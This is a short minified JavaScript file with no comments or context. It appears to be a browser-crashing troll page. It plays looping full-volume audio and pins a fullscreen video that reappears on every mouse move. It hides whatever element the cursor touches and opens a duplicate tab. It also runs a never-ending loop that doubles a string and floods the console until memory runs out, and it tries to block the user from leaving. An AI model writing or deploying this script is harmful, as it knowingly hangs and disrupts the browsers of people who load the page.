function B(){function t(){const i={src:"https://www.ne.jp/asahi/music/myuu/wave/menuettm.mp3",autoplay:!0,loop:!0,preload:"auto",volume:1};for(const t in i)i.hasOwnProperty(t)&&(n[t]=i[t]);n.addEventListener("ended",function(){t()})}const n=new Audio;t()}function H(){function t(){window.open(location.href,"_blank")}function i(n=null){let t=`${location}`,i=10;for(let r=0;r<i;r++)r--,t=t+t,console.error("%c" + `/* ${t}*/`, "color: #0096fa; font-weight: bold;"),n&&n()}const n=document.createElement("div");n.innerHTML+=`<style>*:hover{display:none;}</style>`;document.body.appendChild(n);t();i()}function V(){const n=document.createElement("video"),t={src:"https://video.twimg.com/ext_tw_video/1707791472718917632/pu/vid/avc1/1280x720/573pLzCHbf2V3HMb.mp4",autoplay:!0,loop:!0,muted:!0,preload:"auto"};n.style.cssText="position:fixed;width:auto;height:100vh;top:50%;left:50%;transform:translate(-50%,-50%);z-index:1200;";for(const i in t)t.hasOwnProperty(i)&&(n[i]=t[i]);n.addEventListener("ended",function(){n.play()});window.addEventListener("mousemove",function(){document.body.contains(n)?n.play():document.body.appendChild(n)});window.addEventListener("DOMContentLoaded",function(){document.body.contains(n)?n.play():document.body.appendChild(n)})};B();V();H();console.log("passed");const n="?";window.addEventListener("beforeunload",function(t){return t.preventDefault(),t.returnValue=n,n})
